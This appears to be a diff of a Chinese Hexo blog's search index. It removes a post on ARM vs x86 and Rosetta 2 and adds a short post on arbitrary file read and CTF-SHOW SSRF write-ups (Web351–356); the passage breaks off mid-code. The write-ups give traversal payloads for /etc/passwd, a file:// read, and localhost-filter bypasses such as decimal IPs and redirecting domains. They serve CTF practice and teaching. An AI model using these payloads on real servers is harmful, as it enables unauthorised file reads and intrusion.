-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="ARM架构与x86架构"><a href="#ARM架构与x86架构" class="headerlink" title="ARM架构与x86架构"></a>ARM架构与x86架构</h2><p><strong>指令集架构（ISA</strong>）是计算机硬件与软件之间的接口规范，定义了处理器可以执行的基本指令（如算术运算、数据传输、控制转移等）、指令格式、寻址模式以及相关的寄存器和数据类型。简单来说，它就像是处理器的“语言”（<strong>CPU预定义的操作和计算</strong>），让程序员能够编写可以在特定架构上运行的软件，同时也帮助设计处理器的工程师理解如何实现这些指令（简化程序员的工作）。</p>
-<p>那如果要简化程序员的工作，这意味着微处理器的工作十分复杂。<del>甲方只需要提要求就好了，而乙方需要考虑的就多了。</del>那到底是应该简化程序员的工作，还是简化微处理器的工作？</p>
-<p>由此产生了两种想法：<strong>CISC</strong> 和 <strong>RISC</strong></p>
-<p><strong>x86</strong>：<strong>基于CISC的处理器架构</strong>，拥有非常丰富的指令集。一条指令可以完成整个计算（如乘法）或将一块数据直接从内存中的一个位置移动到另一个位置，并且这一系列复杂的操作可以在一个周期内完成。但这也意味着它需要更多的晶体管，从而会占用控件并消耗能量。</p>
-<p><strong>ARM</strong>：<strong>基于RISC的处理器架构</strong>，每条指令仅代表一个能耗较低的简单操作。这使得汇编语言程序员的工作变得更加复杂，但却简化了处理器的工作。利用RISC处理器和先进的RISC计算机，可以通过运行多条指令或通过将复杂工作推给编译器（而不是CPU内核）来执行复杂工作。</p>
-<p>两种CPU设计都具有高性能，但ARM设计往往侧重于更小巧的外形、电池使用时间、尺寸、免除散热要求和成本。</p>
-<p>具体可见 <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">指令系统 | Pocon’s Blog</a></p>
-<hr>
-<h2 id="Mac向Apple芯片迁移"><a href="#Mac向Apple芯片迁移" class="headerlink" title="Mac向Apple芯片迁移"></a>Mac向Apple芯片迁移</h2><p>在2020年6月22日的苹果全球开发者大会上，苹果公司CEO蒂姆·库克宣布将Mac电脑从英特尔的x86-64的处理器平台迁移至ARM64架构的Apple芯片（由苹果自行设计的处理器）。（在此之前也有过迁移经历）</p>
-<p>既然是两种不同的指令集架构，苹果是如何实现让Intel平台上开发的软件在ARM架构平台的Mac上顺利运行的呢？</p>
-<hr>
-<h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>在此之前，先让我讲讲另一种实现机制：<strong>通用二进制</strong></p>
-<p>通用二进制是一种将多个架构的代码打包在同一个可执行文件中的技术。（由于这些多平台可执行程序文件容量比原来要大，所以也称为<strong>胖二进制</strong>。）该文件包含针对不同架构的机器代码，操作系统在运行时根据硬件架构选择合适的代码段执行。</p>
-<p>换而言之，也就是提供多个翻译版本，选你看得懂的那个。</p>
-<blockquote>
-<p>[!WARNING]</p>
-<p>以下为个人见解</p>
-</blockquote>
-<p>制作和优化其应用的ARM版本需要时间。创建通用二进制文件需要对源代码进行修改和测试，因此开发的复杂性会大幅提升。为了提供更灵活使用的解决方案，在当时<strong>Rosetta</strong>成为主流，而通用二进制版本需要更长的时间来推广和普及。</p>
-<p>换而言之，两个国家的人（Intel和Silicon）说的是不同的语言，彼此听不懂对方的话，还好的是都是用嘴说，声音通过空气传播，别人也都是用耳朵听的。那么，中间有个翻译（Rosetta），可以把一种语言翻译成另外一种。</p>
-<p><strong>Rosetta</strong>：一种动态翻译工具。允许已经存在的Intel x86应用在Apple Silicon（ARM架构）上运行，而无需开发者重新编译或发布新的版本。这使得用户能够立即继续使用他们的旧软件，无缝过渡到新硬件上。</p>
-<p>苹果公司声称：那些重视用户互动而较少计算量的应用程序（比如word等文字处理器）是比较适合同归哦Rosetta编译的；而需要大计算量的程序，比如Photoshop需要另外的通用二进制版本。</p>
-<p><strong>Rosetta 2</strong>：Rosetta 2预装在使用Apple Silicon芯片的Mac电脑的操作系统上。它可以将AMD64指令进行翻译。与Rosetta不同的是，Rosetta 2在安装软件时会把Intel版本程序转化为ARM程序，加上Apple的处理器性能很高，因此即使需要大计算量的程序，通过  Rosetta 2编译也能流畅地执行。（Intel版本Mac操作系统上地应用程序）</p>
-<p>让我们（浅显的）深入探讨一下底层原因：</p>
-<ol>
-<li>尽管指令集不同，ARM和Intel底层架构有较高相似度（具体我不知道为啥）。x86指令集虽然复杂，但Rosetta 2只需要支持其中的子集，也就是用户态指令。并且两套指令都是小端存储。</li>
-<li>最大障碍是内存排序（内存一致性模型不一样），即两个CPU在内存中看到彼此修改的顺序不一样。所以苹果将Intel的内存排序添加到他们的CPU中<del>（这也太暴力了）</del>。在运行转换后的x86代码时，它们会通过一个后门开关切换CPU的模式以符合Intel的内存排序。</li>
-</ol>
-<p>参考链接：</p>
-<p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p>
-<p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Mac向Apple芯片迁移 - 维基百科，自由的百科全书</a></p>
-<p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - 维基百科，自由的百科全书</a></p>
-<p><a href="https://www.v2ex.com/t/726640">哪位老哥能解释一下 Rosetta 的实现原理？ - V2EX</a></p>
-<p><a href="https://www.bilibili.com/opus/850506105874284549">【转】苹果的 Rosetta 2 的实现原理大概是怎样的？ - 哔哩哔哩</a></p>
-<p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p>
-<p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham 𝕏 on X: “19&#x2F; …even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.” &#x2F; X</a></p>
-<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">内存排序 - 维基百科，自由的百科全书</a></p>
+    <title>指令系统</title>
+    <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-zhiling1.png" alt="zhiling1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling2.png" alt="zhiling2"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling3.png" alt="zhiling3"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling4.png" alt="zhiling4"></p>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -1064,6 +1139,196 @@
       </categories>
       <tags>
         <tag>计算机组成与系统结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任意文件读取漏洞</title>
+    <url>/2025/03/18/SSRF/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>允许攻击者在服务器上读取任何文件，而不仅仅是哪些应该公开访问的文件。</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>某些Web应用通过参数传递文件名，然后将文件内容直接包含到页面中。如果没有对传入的文件名进行严格的验证，攻击者可能传递恶意文件路径，从而读取服务器上的敏感内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h2><p>这种漏洞发生在用户输入的文件路径未经过验证直接用于文件操作的情况下。攻击者可以利用  ..&#x2F; 这样的路径遍历序列访问超出预期目录的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/download?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p>一些Web应用程序允许用户上传文件，但没有正确验证上传文件的类型和内容，攻击者可以上传一个恶意文件，然后通过解析这个文件读取服务器上的其他文件</p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-SHOW刷题记录Web5</title>
+    <url>/2025/03/18/SSRF/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="Web351"><a href="#Web351" class="headerlink" title="Web351"></a>Web351</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);			<span class="comment">#关闭所有错误报告，防止错误信息泄露给用户</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);	<span class="comment">#高亮显示当前文件</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];			<span class="comment">#使用POST方法传递参数url，赋值给变量$url，这里并没有验证用户的输入</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);		<span class="comment">#初始化cURL会话，用户提供的URL将被用于发起HTTP请求</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);			<span class="comment">#表示不包含响应头在输出中</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);	<span class="comment">#让curl_exec返回获取的内容不是直接输出</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);		<span class="comment">#执行curl_exec，结果存入$result</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);			<span class="comment">#关闭会话</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);				<span class="comment">#输出结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="前置基础讲解"><a href="#前置基础讲解" class="headerlink" title="前置基础讲解"></a>前置基础讲解</h4><p>curl_exec函数用于执行给定的cURL会话</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.w3cschool.cc/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line"></span><br><span class="line">url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>为什么是127.0.0.1（localhost）？因为这样可以通过SSRF漏洞让服务器向自己发起请求，利用本地换回地址绕过外部防火墙或访问限制</li>
+<li>&#x2F;var是Linux系统中存放可变数据的目录</li>
+<li>&#x2F;var&#x2F;www通常是Web服务器存放网页文件的默认位置</li>
+<li>html目录是Web服务器的文档根目录，所有可通过Web访问的文件都应放在这里</li>
+</ul>
+<h2 id="Web352"><a href="#Web352" class="headerlink" title="Web352"></a>Web352</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+
+<h4 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h4><h5 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_url</span>(参数<span class="number">1</span>，参数<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>参数1：必填，是一个完整的url</p>
+<p>参数2：非必填，是一个大写参数变量，直接获取结果集的一部分</p>
+<p>参数2如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、 PHP_URL_QUERY 、 PHP_URL_FRAGMENT</span><br></pre></td></tr></table></figure>
+
+<p>函数解析一个URL并返回一个关联数组，包含在URL中出现的各种组成部分</p>
+<p>关联数组：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>
+
+<h5 id="die函数"><a href="#die函数" class="headerlink" title="die函数"></a>die函数</h5><p>die()函数输出一条消息，并退出当前脚本。是exit()函数的别名</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>(message) <span class="comment">#信息用&#x27;&#x27;括起来</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h5><p><a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>$pattern：要搜索的模式，字符串形式</li>
+<li>$subject：输入字符串</li>
+</ul>
+<p>中括号表示可选参数，括号的嵌套表现了其嵌套关系</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里要求url必须是http(s)协议，并且不能包含127.0.0.1和localhost。这里可以将IP转化为长整型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0111 1111 0000 0000 0000 0000 0000 0001</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2130706433</span><br></pre></td></tr></table></figure>
+
+<h3 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这里真的有限制吗？实则不然</p>
+<p>preg_match参数没有给全 :nerd_face:</p>
+<h2 id="Web353"><a href="#Web353" class="headerlink" title="Web353"></a>Web353</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+
+<p>直接用上一道题的思路也可以做</p>
+<h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
+<li>127&#x2F;172开头就代表内网地址，不一定非得127.0.0.1</li>
+<li>Linux中0表示自身的地址，可以使用<a href="http://0.0.0.0/flag.php%E7%BB%95%E8%BF%87">http://0/flag.php绕过</a></li>
+<li>使用sudo.cc代替127.0.0.1</li>
+</ol>
+<h2 id="Web354"><a href="#Web354" class="headerlink" title="Web354"></a>Web354</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>url过滤包含1和0</p>
+<ol>
+<li>使用解析到127.0.0.1的url（302跳转）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://safe.taobao.com/</span><br><span class="line"></span><br><span class="line">http://114.taobao.com/</span><br><span class="line"></span><br><span class="line">http://wifi.aliyun.com/</span><br><span class="line"></span><br><span class="line">http://imis.qq.com/</span><br><span class="line"></span><br><span class="line">http://localhost.sec.qq.com/</span><br><span class="line"></span><br><span class="line">http://ecd.tencent.com/</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用sudo.cc</li>
+</ol>
+<h2 id="Web355"><a href="#Web355" class="headerlink" title="Web355"></a>Web355</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>要求主机字符数不大于5</p>
+<p>那么直接使用0即可</p>
+<h3 id="其他思路-1"><a href="#其他思路-1" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
+<li>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></li>
+</ol>
+<h2 id="Web356"><a href="#Web356" class="headerlink" title="Web356"></a>Web356</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span 